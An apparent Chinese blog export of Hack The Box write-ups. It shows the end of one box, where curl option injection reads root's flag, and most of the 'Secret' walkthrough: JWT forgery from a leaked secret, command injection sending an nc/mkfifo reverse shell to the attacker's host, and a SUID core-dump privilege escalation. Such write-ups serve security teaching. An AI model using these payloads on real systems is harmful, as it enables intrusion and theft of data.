pycdas\n[ 92%] Building CXX object CMakeFiles/pycdc.dir/pycdc.cpp.o\n[ 95%] Building CXX object CMakeFiles/pycdc.dir/ASTree.cpp.o\n[ 97%] Building CXX object CMakeFiles/pycdc.dir/ASTNode.cpp.o\n[100%] Linking CXX executable pycdc\n[100%] Built target pycdc\n```\n```bash\n┌──(root💀kali)-[~/Desktop/pyinstxtractor/pycdc]\n└─# ./pycdc /root/Desktop/pyinstxtractor/treport_extracted/treport.pyc \n# Source Generated with Decompyle++\n# File: treport.pyc (Python 3.9)\n\nUnsupported opcode: <255>\nimport os\nimport sys\nfrom datetime import datetime\nimport re\n\nclass threat_report:\n\n    def create(self):\nUnsupported opcode: <255>\n        file_name = input('Enter the filename:')\n        content = input('Enter the report:')\n        if '../' in file_name:\n            print('NOT ALLOWED')\n            sys.exit(0)\n        file_path = '/root/reports/' + file_name\n    # WARNING: Decompyle incomplete\n\n\n    def list_files(self):\n        file_list = os.listdir('/root/reports/')\n        files_in_dir = ' '.join((lambda .0: [ str(elem) for elem in .0 ])(file_list))\n        print('ALL THE THREAT REPORTS:')\n        print(files_in_dir)\n\n\n    def read_file(self):\nUnsupported opcode: <255>\n        file_name = input('\\nEnter the filename:')\n        if '../' in file_name:\n            print('NOT ALLOWED')\n            sys.exit(0)\n        contents = ''\n        file_name = '/root/reports/' + file_name\n    # WARNING: Decompyle incomplete\n\n\n    def download(self):\n        now = datetime.now()\n        current_time = now.strftime('%H_%M_%S')\n        command_injection_list = [\n            '$',\n            '`',\n            ';',\n            '&',\n            '|',\n            '||',\n            '>',\n            '<',\n            '?',\n            \"'\",\n            '@',\n            '#',\n            '$',\n            '%',\n            '^',\n            '(',\n            ')']\n        ip = input('Enter the IP/file_name:')\n        res = bool(re.search('\\\\s', ip))\n        if res:\n            print('INVALID IP')\n            sys.exit(0)\n        if 'file' in ip and 'gopher' in ip or 'mysql' in ip:\n            print('INVALID URL')\n            sys.exit(0)\n        cmd = '/bin/bash -c \"curl ' + ip + ' -o /root/reports/threat_report_' + current_time + '\"'\n        os.system(cmd)\n\n# WARNING: Decompyle incomplete\n```\n通过分析上述源码，我们可以看到这里使用curl命令来下载，但是使用了过滤，想办法构造语句绕过一下即可\n\n```bash\ncode@code:~$ sudo /usr/bin/treport\n1.Create Threat Report.\n2.Read Threat Report.\n3.Download A Threat Report.\n4.Quit.\nEnter your choice:3\nEnter the IP/file_name:{--config,/root/root.txt}\nWarning: /root/root.txt:1: warning: '2f935df00d52a1b17035600df088e81d' is \nWarning: unknown\ncurl: no URL specified!\ncurl: try 'curl --help' or 'curl --manual' for more information\n```\n直接使用下载，并构造恶意语句读取指定的文件即可，成功拿到root权限的flag文件","tags":["Hackthebox"]},{"title":"Secret - Hackthebox","url":"/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/","content":"\n# Hackthebox - Secret\n## **靶场信息**\n![](Hackthebox-Secret/image1.png)\n\n## **靶场类型**\n![](Hackthebox-Secret/image2.png)\n\n## **信息搜集**\n首先进行端口扫描\n\n```Plain Text\n┌──(root💀kali)-[~/Desktop]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.120\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-11-08 02:09 EST\nNmap scan report for 10.10.11.120\nHost is up (0.40s latency).\nNot shown: 65532 closed ports\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)\n|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)\n|_  256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)\n80/tcp   open  http    nginx 1.18.0 (Ubuntu)\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n|_http-title: DUMB Docs\n3000/tcp open  http    Node.js (Express middleware)\n|_http-title: DUMB Docs\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=11/8%OT=22%CT=1%CU=33102%PV=Y%DS=2%DC=T%G=Y%TM=6188CD7\nOS:B%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ\nOS:(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O\nOS:3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2=\nOS:FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSN\nOS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D\nOS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O\nOS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W\nOS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R\nOS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 995/tcp)\nHOP RTT       ADDRESS\n1   851.60 ms 10.10.14.1\n2   713.96 ms 10.10.11.120\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 80.73 seconds\n```\n经过查看后发现`80`端口和`3000`端口内容一致\n\n咱们去看看`80`端口的内容\n\n![](Hackthebox-Secret/image3.png)\n\n这好像是一个文件管理服务器之类的什么东西的？咱英文不好，咱也不知道，咱也不敢问\n\n右上角有个按钮`Live Demo`，反正点了也不会爆炸，点点看呗\n\n![](Hackthebox-Secret/image4.png)\n\n这是API接口啊，但是好像没有内容，咱们往下看看\n\n![](Hackthebox-Secret/image5.png)\n\n这里好像是可以下载源代码，管他的先下载下来看看呗\n\n![](Hackthebox-Secret/image6.png)\n\n这应该是一个开源项目，然后还有git文件泄露，那就先下载下来嘛\n\n> https://github.com/LucifielHack/GitTools\n\n下载下来后利用一下\n\n```Plain Text\n/root/Desktop/GitTools/Extractor/extractor.sh local-web/ dump\n```\n内容比较多，咱们等他先下载完吧，等的时候可以去看会儿视频\n\n```Plain Text\n┌──(root💀kali)-[~/Desktop/dump]\n└─# ls -la\n总用量 32\ndrwxr-xr-x 8 root root 4096 11月 29 20:53 .\ndrwxr-xr-x 6 root root 4096 11月 29 20:47 ..\ndrwxr-xr-x 7 root root 4096 11月 29 20:48 0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb\ndrwxr-xr-x 7 root root 4096 11月 29 20:50 1-55fe756a29268f9b4e786ae468952ca4a8df1bd8\ndrwxr-xr-x 7 root root 4096 11月 29 20:51 2-e297a2797a5f62b6011654cf6fb6ccb6712d2d5b\ndrwxr-xr-x 7 root root 4096 11月 29 20:52 3-de0a46b5107a2f4d26e348303e76d85ae4870934\ndrwxr-xr-x 7 root root 4096 11月 29 20:53 4-67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78\ndrwxr-xr-x 7 root root 4096 11月 29 20:54 5-3a367e735ee76569664bf7754eaaade7c735d702\n```\n完成后可以看到有提取出六次数据，咱们随便进一个看看\n\n```Plain Text\n┌──(root💀kali)-[~/Desktop/dump/0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb]\n└─# ls -la\n总用量 116\ndrwxr-xr-x   7 root root  4096 11月 29 20:48 .\ndrwxr-xr-x   8 root root  4096 11月 29 20:53 ..\n-rw-r--r--   1 root root   219 11月 29 20:47 commit-meta.txt\n-rw-r--r--   1 root root   174 11月 29 20:47 .env\n-rw-r--r--   1 root root   885 11月 29 20:47 index.js\ndrwxr-xr-x   2 root root  4096 11月 29 20:47 model\ndrwxr-xr-x 201 root root  4096 11月 29 20:48 node_modules\n-rw-r--r--   1 root root   491 11月 29 20:48 package.json\n-rw-r--r--   1 root root 69452 11月 29 20:48 package-lock.json\ndrwxr-xr-x   3 root root  4096 11月 29 20:48 public\ndrwxr-xr-x   2 root root  4096 11月 29 20:48 routes\ndrwxr-xr-x   4 root root  4096 11月 29 20:48 src\n-rw-r--r--   1 root root   651 11月 29 20:48 validations.js\n```\n可以确定是一个源码库了，突破口在`/routes/auto.js`中\n\n```Plain Text\nconst router = require('express').Router();\nconst User = require('../model/user');\nconst bcrypt = require('bcryptjs')\nconst jwt = require('jsonwebtoken')\nconst { registerValidation, loginValidation} = require('../validations')\n\nrouter.post('/register', async (req, res) => {\n\n    // validation\n    const { error } = registerValidation(req.body)\n    if (error) return res.status(400).send(error.details[0].message);\n\n    // check if user exists\n    const emailExist = await User.findOne({email:req.body.email})\n    if (emailExist) return res.status(400).send('Email already Exist')\n\n    // check if user name exist\n    const unameexist = await User.findOne({ name: req.body.name })\n    if (unameexist) return res.status(400).send('Name already Exist')\n\n    //hash the password\n    const salt = await bcrypt.genSalt(10);\n    const hashPaswrod = await bcrypt.hash(req.body.password, salt)\n\n    //create a user\n    const user = new User({\n        name: req.body.name,\n        email: req.body.email,\n        password:hashPaswrod\n    });\n\n    try{\n        const saveduser = await user.save();\n        res.send({ user: user.name})\n\n    }\n    catch(err){\n        console.log(err)\n    }\n\n});\n\n// login\n\nrouter.post('/login', async  (req , res) => {\n\n    const { error } = loginValidation(req.body)\n    if (error) return res.status(400).send(error.details[0].message);\n\n    // check if email is okay\n    const user = await User.findOne({ email: req.body.email })\n    if (!user) return res.status(400).send('Email is wrong');\n\n    // check password\n    const validPass = await bcrypt.compare(req.body.password, user.password)\n    if (!validPass) return res.status(400).send('Password is wrong');\n\n    // create jwt\n    const token = jwt.sign({ _id: user.id, name: user.name , email: user.email}, process.env.TOKEN_SECRET )\n    res.header('auth-token', token).send(token);\n\n})\n\nrouter.use(function (req, res, next) {\n    res.json({\n        message: {\n\n            message: \"404 page not found\",\n            desc: \"page you are looking for is not found. \"\n        }\n    })\n});\n\nmodule.exports = router\n```\n这是`auto.js` 内的源码，可以看出来有`/register`来请求它\n\n首先添加一个DNS解析\n\n```Plain Text\necho 10.10.11.120 secret.htb >> /etc/hosts\n```\n构造一个payload来注册用户\n\n```Plain Text\ncurl -X POST -H 'Content-Type: application/json' -v http://secret.htb/api/user/register --data '{\"name\": \"lucifiel\",\"email\": \"lucifiel@lucifiel.com\",\"password\": \"123456\"}'\n```\n然后使用注册的用户进行登录\n\n```Plain Text\ncurl -X POST -H 'Content-Type: application/json' -v http://secret.htb/api/user/login --data '{\"email\": \"lucifiel@lucifiel.com\",\"password\": \"123456\"}'\n```\n```Plain Text\n┌──(root💀kali)-[~]\n└─# curl -X POST -H 'Content-Type: application/json' -v http://secret.htb/api/user/login --data '{\"email\": \"lucifiel@lucifiel.com\",\"password\": \"123456\"}'\nNote: Unnecessary use of -X or --request, POST is already inferred.\n*   Trying 10.10.11.120:80...\n* Connected to secret.htb (10.10.11.120) port 80 (#0)\n> POST /api/user/login HTTP/1.1\n> Host: secret.htb\n> User-Agent: curl/7.74.0\n> Accept: */*\n> Content-Type: application/json\n> Content-Length: 55\n>\n* upload completely sent off: 55 out of 55 bytes\n* Mark bundle as not supporting multiuse\n< HTTP/1.1 200 OK\n< Server: nginx/1.18.0 (Ubuntu)\n< Date: Mon, 06 Dec 2021 06:28:56 GMT\n< Content-Type: text/html; charset=utf-8\n< Content-Length: 216\n< Connection: keep-alive\n< X-Powered-By: Express\n< auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoibHVjaWZpZWwiLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.i-XDDPEDPnogLpVNIKO-U4vQCyQqsIWCN5Ib_OjwSrM\n< ETag: W/\"d8-L4wZphXtP/sfJQE0ke71PfuUMnY\"\n<\n* Connection #0 to host secret.htb left intact\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoibHVjaWZpZWwiLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.i-XDDPEDPnogLpVNIKO-U4vQCyQqsIWCN5Ib_OjwSrM\n```\n成功登录并获取到token\n\n查看并分析`/routes/verifytoken.js`文件的内容\n\n```Plain Text\nconst jwt = require(\"jsonwebtoken\");\n\nmodule.exports = function (req, res, next) {\n    const token = req.header(\"auth-token\");\n    if (!token) return res.status(401).send(\"Access Denied\");\n\n    try {\n        const verified = jwt.verify(token, process.env.TOKEN_SECRET);\n        req.user = verified;\n        next();\n    } catch (err) {\n        res.status(400).send(\"Invalid Token\");\n    }\n};\n```\n我们知道了JWT令牌的验证过程，那我们就构造一个payload查看一下我们当前的权限\n\n```Plain Text\ncurl http://secret.htb/api/priv -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoibHVjaWZpZWwiLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.i-XDDPEDPnogLpVNIKO-U4vQCyQqsIWCN5Ib_OjwSrM'\n```\n```Plain Text\n┌──(root💀kali)-[~]\n└─# curl http://secret.htb/api/priv -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoibHVjaWZpZWwiLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.i-XDDPEDPnogLpVNIKO-U4vQCyQqsIWCN5Ib_OjwSrM'\n{\"role\":{\"role\":\"you are normal user\",\"desc\":\"lucifiel\"}}\n```\n得到回包，我们是一个普通用户权限\n\n```Plain Text\n┌──(root💀kali)-[~/Desktop/dump/0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb]\n└─# cat .env\nDB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'\nTOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE\n```\n查看根目录的`.env`文件，得到了一段tokne\n\n```Plain Text\nconst router = require('express').Router();\nconst verifytoken = require('./verifytoken')\nconst User = require('../model/user');\n\nrouter.get('/priv', verifytoken, (req, res) => {\n   // res.send(req.user)\n\n    const userinfo = { name: req.user }\n\n    const name = userinfo.name.name;\n\n    if (name == 'theadmin'){\n        res.json({\n            role:{\n\n                role:\"you are admin\",\n                desc : \"{flag will be here}\"\n            }\n        })\n    }\n    else{\n        res.json({\n            role: {\n                role: \"you are normal user\",\n                desc: userinfo.name.name\n            }\n        })\n    }\n\n})\n\nrouter.use(function (req, res, next) {\n    res.json({\n        message: {\n\n            message: \"404 page not found\",\n            desc: \"page you are looking for is not found. \"\n        }\n    })\n});\n\nmodule.exports = router\n```\n通过查看private.js得知验证逻辑是只要name = theadmin 就是admin账户，那我们来伪造一个JWT令牌即可\n\n使用在线JWT修改工具或jwt\\_tools进行JWT令牌修改都可以\n\n> https://jwt.io/\n\n\n\n> [https://github.com/ticarpi/jwt\\_tool](https://github.com/ticarpi/jwt_tool)\n\n### **在线工具**\n然后伪造一个admin的token就可以了\n\n![](Hackthebox-Secret/image7.png)\n\n这里需要修改两个地方，把name处修改为theadmin，然后在下方框内填入我们在`.env`获取到的token值，即可生成一段新的JWT令牌\n\n### **JWT\\_Tools**\n```Plain Text\npython3 jwt_tool.py -I -S hs256 -pc 'name' -pv 'theadmin' -p 'gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE' eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTdlMjgxZWU2N2QzZTA4NTMzOGEzZjYiLCJuYW1lIjoib29wc2llIiwiZW1haWwiOiJvb3BzaWVAb29wcy5jb20iLCJpYXQiOjE2MzU2NTc4NTd9.7v-DST155DL_5yuhC9Zbe2rdyPiGCcd8aeYUucQLVzU\n```\n我们继续\n\n```Plain Text\n┌──(root💀kali)-[~/Desktop/dump/0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb]\n└─# curl http://secret.htb/api/priv -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.FM3CbCKxrJ79hXwF02Rg3jsi5bpNeg1txPyb2nWbAA0'\n{\"creds\":{\"role\":\"admin\",\"username\":\"theadmin\",\"desc\":\"welcome back admin\"}}\n```\n我们去验证一下新的JWT令牌，发现已经是admin权限了\n\n通过分析private.js文件，我们发现必须将文件名指定为带有名称文件的get参数\n\n```Plain Text\n┌──(root💀kali)-[~/Desktop/dump/0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/routes]\n└─# curl 'http://secret.htb/api/logs?file=/etc/passwd' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.FM3CbCKxrJ79hXwF02Rg3jsi5bpNeg1txPyb2nWbAA0'\n{\"killed\":false,\"code\":128,\"signal\":null,\"cmd\":\"git log --oneline /etc/passwd\"}\n```\n看着感觉像是命令注入？\n\n## **漏洞利用**\n```Plain Text\n┌──(root💀kali)-[~/Desktop/dump/0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/routes]\n└─# curl 'http://secret.htb/api/logs?file=;id' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.FM3CbCKxrJ79hXwF02Rg3jsi5bpNeg1txPyb2nWbAA0'\n\"80bf34c fixed typos 🎉\\n0c75212 now we can view logs from server 😃\\nab3e953 Added the codes\\nuid=1000(dasith) gid=1000(dasith) groups=1000(dasith)\\n\"\n```\nOK，确认漏洞是存在的，那么我们现在先使用nc监听一个端口\n\n```Plain Text\nnc -nvlp 4444\n```\n然后接着构造一个payload来进行利用\n\n```Plain Text\n┌──(root💀kali)-[~/Desktop/dump/0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/routes]\n└─# curl 'http://secret.htb/api/logs?file=;rm+%2Ftmp%2Ff%3Bmkfifo+%2Ftmp%2Ff%3Bcat+%2Ftmp%2Ff%7C%2Fbin%2Fsh+-i+2%3E%261%7Cnc+10.10.14.12+4444+%3E%2Ftmp%2Ff%0A%0A' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.FM3CbCKxrJ79hXwF02Rg3jsi5bpNeg1txPyb2nWbAA0'\n{\"killed\":false,\"code\":1,\"signal\":null,\"cmd\":\"git log --oneline ;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.12 4444 >/tmp/f\\n\\n\"}\n```\n```Plain Text\n┌──(root💀kali)-[~]\n└─# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.14.12] from (UNKNOWN) [10.10.11.120] 40314\n/bin/sh: 0: can't access tty; job control turned off\n$ python3 -c \"import pty;pty.spawn('/bin/bash')\";\ndasith@secret:~/local-web$ whoami&&id\nwhoami&&id\ndasith\nuid=1000(dasith) gid=1000(dasith) groups=1000(dasith)\n```\n成功获取到一个shell\n\n```Plain Text\ndasith@secret:~/local-web$ cd\ncd\ndasith@secret:~$ ls\nls\nlocal-web  user.txt\ndasith@secret:~$ cat user.txt\ncat user.txt\n2b3b6e0a590097b69da4de9631b570fd\n```\n成功获取到user权限的flag文件\n\n## **权限提升**\n查看一下当前的可执行文件\n\n```Plain Text\nfind / -type f -perm -u=s 2>/dev/null\n```\n```Plain Text\ndasith@secret:~$ find / -type f -perm -u=s 2>/dev/null\nfind / -type f -perm -u=s 2>/dev/null\n/usr/bin/pkexec\n/usr/bin/sudo\n/usr/bin/fusermount\n/usr/bin/umount\n/usr/bin/mount\n/usr/bin/gpasswd\n/usr/bin/su\n/usr/bin/passwd\n/usr/bin/chfn\n/usr/bin/newgrp\n/usr/bin/chsh\n/usr/lib/snapd/snap-confine\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/policykit-1/polkit-agent-helper-1\n/opt/count\n/snap/snapd/13640/usr/lib/snapd/snap-confine\n/snap/snapd/13170/usr/lib/snapd/snap-confine\n/snap/core20/1169/usr/bin/chfn\n/snap/core20/1169/usr/bin/chsh\n/snap/core20/1169/usr/bin/gpasswd\n/snap/core20/1169/usr/bin/mount\n/snap/core20/1169/usr/bin/newgrp\n/snap/core20/1169/usr/bin/passwd\n/snap/core20/1169/usr/bin/su\n/snap/core20/1169/usr/bin/sudo\n/snap/core20/1169/usr/bin/umount\n/snap/core20/1169/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/snap/core20/1169/usr/lib/openssh/ssh-keysign\n/snap/core18/2128/bin/mount\n/snap/core18/2128/bin/ping\n/snap/core18/2128/bin/su\n/snap/core18/2128/bin/umount\n/snap/core18/2128/usr/bin/chfn\n/snap/core18/2128/usr/bin/chsh\n/snap/core18/2128/usr/bin/gpasswd\n/snap/core18/2128/usr/bin/newgrp\n/snap/core18/2128/usr/bin/passwd\n/snap/core18/2128/usr/bin/sudo\n/snap/core18/2128/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/snap/core18/2128/usr/lib/openssh/ssh-keysign\n/snap/core18/1944/bin/mount\n/snap/core18/1944/bin/ping\n/snap/core18/1944/bin/su\n/snap/core18/1944/bin/umount\n/snap/core18/1944/usr/bin/chfn\n/snap/core18/1944/usr/bin/chsh\n/snap/core18/1944/usr/bin/gpasswd\n/snap/core18/1944/usr/bin/newgrp\n/snap/core18/1944/usr/bin/passwd\n/snap/core18/1944/usr/bin/sudo\n/snap/core18/1944/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/snap/core18/1944/usr/lib/openssh/ssh-keysign\n```\n获取到了一些可执行的二进制文件\n\n我们把目光着眼放在`/opt/count`上\n\n```Plain Text\ndasith@secret:/opt$ cat code.c\ncat code.c\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <string.h>\n#include <dirent.h>\n#include <sys/prctl.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <linux/limits.h>\n\nvoid dircount(const char *path, char *summary)\n{\n    DIR *dir;\n    char fullpath[PATH_MAX];\n    struct dirent *ent;\n    struct stat fstat;\n\n    int tot = 0, regular_files = 0, directories = 0, symlinks = 0;\n\n    if((dir = opendir(path)) == NULL)\n    {\n        printf(\"\\nUnable to open directory.\\n\");\n        exit(EXIT_FAILURE);\n    }\n    while ((ent = readdir(dir)) != NULL)\n    {\n        ++tot;\n        strncpy(fullpath, path, PATH_MAX-NAME_MAX-1);\n        strcat(fullpath, \"/\");\n        strncat(fullpath, ent->d_name, strlen(ent->d_name));\n        if (!lstat(fullpath, &fstat))\n        {\n            if(S_ISDIR(fstat.st_mode))\n            {\n                printf(\"d\");\n                ++directories;\n            }\n            else if(S_ISLNK(fstat.st_mode))\n            {\n                printf(\"l\");\n                ++symlinks;\n            }\n            else if(S_ISREG(fstat.st_mode))\n            {\n                printf(\"-\");\n                ++regular_files;\n            }\n            else printf(\"?\");\n            printf((fstat.st_mode & S_IRUSR) ? \"r\" : \"-\");\n            printf((fstat.st_mode & S_IWUSR) ? \"w\" : \"-\");\n            printf((fstat.st_mode & S_IXUSR) ? \"x\" : \"-\");\n            printf((fstat.st_mode & S_IRGRP) ? \"r\" : \"-\");\n            printf((fstat.st_mode & S_IWGRP) ? \"w\" : \"-\");\n            printf((fstat.st_mode & S_IXGRP) ? \"x\" : \"-\");\n            printf((fstat.st_mode & S_IROTH) ? \"r\" : \"-\");\n            printf((fstat.st_mode & S_IWOTH) ? \"w\" : \"-\");\n            printf((fstat.st_mode & S_IXOTH) ? \"x\" : \"-\");\n        }\n        else\n        {\n            printf(\"??????????\");\n        }\n        printf (\"\\t%s\\n\", ent->d_name);\n    }\n    closedir(dir);\n\n    snprintf(summary, 4096, \"Total entries       = %d\\nRegular files       = %d\\nDirectories         = %d\\nSymbolic links      = %d\\n\", tot, regular_files, directories, symlinks);\n    printf(\"\\n%s\", summary);\n}\n\nvoid filecount(const char *path, char *summary)\n{\n    FILE *file;\n    char ch;\n    int characters, words, lines;\n\n    file = fopen(path, \"r\");\n\n    if (file == NULL)\n    {\n        printf(\"\\nUnable to open file.\\n\");\n        printf(\"Please check if file exists and you have read privilege.\\n\");\n        exit(EXIT_FAILURE);\n    }\n\n    characters = words = lines = 0;\n    while ((ch = fgetc(file)) != EOF)\n    {\n        characters++;\n        if (ch == '\\n' || ch == '\\0')\n            lines++;\n        if (ch == ' ' || ch == '\\t' || ch == '\\n' || ch == '\\0')\n            words++;\n    }\n\n    if (characters > 0)\n    {\n        words++;\n        lines++;\n    }\n\n    snprintf(summary, 256, \"Total characters = %d\\nTotal words      = %d\\nTotal lines      = %d\\n\", characters, words, lines);\n    printf(\"\\n%s\", summary);\n}\n\nint main()\n{\n    char path[100];\n    int res;\n    struct stat path_s;\n    char summary[4096];\n\n    printf(\"Enter source file/directory name: \");\n    scanf(\"%99s\", path);\n    getchar();\n    stat(path, &path_s);\n    if(S_ISDIR(path_s.st_mode))\n        dircount(path, summary);\n    else\n        filecount(path, summary);\n\n    // drop privs to limit file write\n    setuid(getuid());\n    // Enable coredump generation\n    prctl(PR_SET_DUMPABLE, 1);\n    printf(\"Save results a file? [y/N]: \");\n    res = getchar();\n    if (res == 121 || res == 89) {\n        printf(\"Path: \");\n        scanf(\"%99s\", path);\n        FILE *fp = fopen(path, \"a\");\n        if (fp != NULL) {\n            fputs(summary, fp);\n            fclose(fp);\n        } else {\n            printf(\"Could not open %s for writing\\n\", path);\n        }\n    }\n\n    return 0;\n}\n```\n这是count的源码，通过分析后得知\n\n这里大多数情况下，如果我们在执行代码中崩溃了，报告通常会保存在`/var/crash`中\n\n在通常情况下，这是不可能的，但是通过这个pem设置`prctl(PR_SET_DUMPABLE, 1);`，它可以被实现\n\n由于它设置为1，我们可以产生核心转储，利用的话需要两个条件\n\n1. 首先需要确保有两个shell\n2. 可以导致崩溃\n\n现在让我们去用上面漏洞利用的方式再获取一个shell\n\n### **Shell 1**\n```Plain Text\ndasith@secret:/$ cd /opt\ncd /opt\ndasith@secret:/opt$ ./count -p\n./count -p\nEnter source file/directory name: /root/root.txt\n/root/root.txt\n\nTotal characters = 33\nTotal words      = 2\nTotal lines      = 2\nSave results a file? [y/N]: y\ny\n```\n执行后去shell 2让进程崩溃\n\n### **Shell 2**\n```Plain Text\ndasith@secret:~/local-web$ cd /opt\ncd /opt\ndasith@secret:/opt$ ps -aux | grep count\nps -aux | grep count\nroot         862  0.0  0.1 235672  7480 ?        Ssl  06:15   0:00 /usr/lib/accountsservice/accounts-daemon\nroot        1342  0.0  0.0   2488   516 ?        S    06:50   0:00 ./count\nroot        1435  0.0  0.0   2488   588 ?        S    06:54   0:00 ./count\ndasith      1460  0.0  1.0  52448 41712 ?        S    07:00   0:00 gdb ./count\ndasith      1462  0.0  0.0   2488   600 ?        S    07:00   0:00 /opt/count\nroot        1850  0.0  0.0   2488   592 pts/0    S+   07:41   0:00 ./count -p\ndasith      1885  0.0  0.0   2488   524 pts/4    S+   07:43   0:00 ./count -p\ndasith      1887  0.0  0.0   6432   740 pts/2    S+   07:44   0:00 grep --color=auto count\ndasith@secret:/opt$ kill -BUS 1885\nkill -BUS 1885\n```\n然后再去shell1检查进程是否崩溃\n\n### **Shell 1 第二次**\n```Plain Text\nPath: Bus error (core dumped)\n```\n已经看到这句提示了，但作为保险我们还是再验证一次\n\n```Plain Text\ndasith@secret:/opt$ 